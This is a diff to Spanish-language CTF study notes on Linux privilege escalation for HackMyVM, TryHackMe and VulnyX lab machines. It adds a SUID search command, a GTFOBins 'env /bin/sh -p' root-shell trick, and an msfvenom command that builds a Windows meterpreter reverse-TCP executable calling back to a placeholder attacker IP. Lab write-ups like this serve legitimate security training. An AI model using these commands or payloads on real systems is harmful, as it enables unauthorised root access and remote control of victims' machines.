@@ -8,7 +8,7 @@ icon: '7'
 
 {% embed url="https://hackmyvm.eu/machines/machine.php?vm=Friendly" %}
 
-Subimos el payload a través del protócolo FTP. Nos ponemos en escucha mientras carga la página para la **Reverse Shell**. Hacemos tratamiento de la **TTY**.&#x20;
+Subimos el payload a través del protocolo FTP. Nos ponemos en escucha mientras carga la página para la **Reverse Shell**. Hacemos tratamiento de la **TTY**.&#x20;
 
 {% embed url="https://gtfobins.github.io/" %}
 
@@ -21,6 +21,8 @@ Con el comando proporcionado en la página debemos de poner la ruta absoluta.
 ## Escalada de Privilegios en Linux – Sudo -l | Parte 2
 
 {% embed url="https://tryhackme.com/room/brooklynninenine" %}
+
+{% embed url="https://gtfobins.github.io/gtfobins/less/#suid" %}
 
 ```bash
 sudo -l 
@@ -64,3 +66,24 @@ bash -p
 ```
 
 ## Escalada de Privilegios en Linux – Binarios SUID | Parte 2
+
+{% embed url="https://vulnyx.com/#basic" %}
+
+```
+find / -perm -4000 2>/dev/null
+```
+
+{% embed url="https://gtfobins.github.io/gtfobins/env/" %}
+
+```bash
+env /bin/sh -p
+```
+
+## Escalada de Privilegios Automática con Metasploit en Linux & Windows
+
+{% embed url="https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing" %}
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP máquina atacante> LPORT=4444 -f exe -o virus.exe
+```
+
